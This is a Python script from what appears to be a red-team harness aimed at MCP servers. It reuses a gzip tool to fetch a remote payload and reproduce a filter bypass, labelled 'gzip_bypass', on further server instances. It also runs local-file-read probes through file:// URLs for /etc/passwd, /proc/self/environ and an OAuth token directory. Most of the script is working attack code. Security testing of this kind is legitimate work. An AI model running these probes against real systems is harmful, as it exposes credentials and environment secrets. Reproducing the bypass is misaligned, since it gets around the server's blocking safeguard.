import sys, json, base64, gzip
sys.path.insert(0, ".skill-workspace/red-team/context-mcp-rt-matrix/agent3/harness")
from lib import call_tool, save_evidence

RAW_URL = "https://gist.githubusercontent.com/AnshSinghal/c3e11fbf92cc0f8784f3c4f169efa48a/raw/rt3_payload.json"
results = []

def try_fetch(server, data, note, fname):
    rec = call_tool(server, "gzip-file-as-resource", {"name": "x.gz", "data": data, "outputType": "resource"}, note=note, timeout=30)
    body = rec["response"].get("body", {})
    content = body.get("result", {}).get("content", [])
    is_error = body.get("result", {}).get("isError", False)
    blocked = any("[BLOCKED]" in (c.get("text","") if isinstance(c,dict) else "") for c in content) if isinstance(content, list) else False
    blob = None
    text_out = None
    for c in content:
        if isinstance(c, dict):
            if c.get("type") == "resource":
                blob = c.get("resource", {}).get("blob")
            if "text" in c:
                text_out = c["text"]
    decompressed = None
    if blob:
        try:
            decompressed = gzip.decompress(base64.b64decode(blob)).decode("utf-8", errors="replace")
        except Exception as e:
            decompressed = f"<decompress error: {e}>"
    path = save_evidence(rec, fname)
    r = {"server": server, "note": note, "is_error": is_error, "blocked": blocked, "text_out": text_out, "has_blob": bool(blob), "decompressed_preview": (decompressed[:500] if decompressed else None), "evidence": path}
    results.append(r)
    print(f"[{server}] {note}: blocked={blocked} isError={is_error} has_blob={bool(blob)} decompressed={str(decompressed)[:150] if decompressed else None}")
    return r

# Reproduce on a 2nd server instance
try_fetch("cp09-ens8do", RAW_URL, "reproduce on cp09-ens8do (2nd server)", "gzip_bypass/repro_cp09-ens8do.json")
try_fetch("everything-1", RAW_URL, "reproduce on everything-1 (3rd server)", "gzip_bypass/repro_everything-1.json")

# Local file read attempt (LFI via file:// scheme)
try_fetch("everything-mcp", "file:///etc/passwd", "LFI probe: file:///etc/passwd", "gzip_bypass/lfi_etc_passwd.json")
try_fetch("everything-mcp", "file:///etc/hostname", "LFI probe: file:///etc/hostname", "gzip_bypass/lfi_hostname.json")
try_fetch("everything-mcp", "file:///proc/self/environ", "LFI probe: /proc/self/environ (full unscrubbed process env)", "gzip_bypass/lfi_proc_environ.json")
try_fetch("everything-mcp", "file:///data/mcp-auth/", "LFI probe: MCP_REMOTE_CONFIG_DIR (OAuth token store)", "gzip_bypass/lfi_mcp_auth_dir.json")

with open(".skill-workspace/red-team/context-mcp-rt-matrix/agent3/evidence/_run6_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)
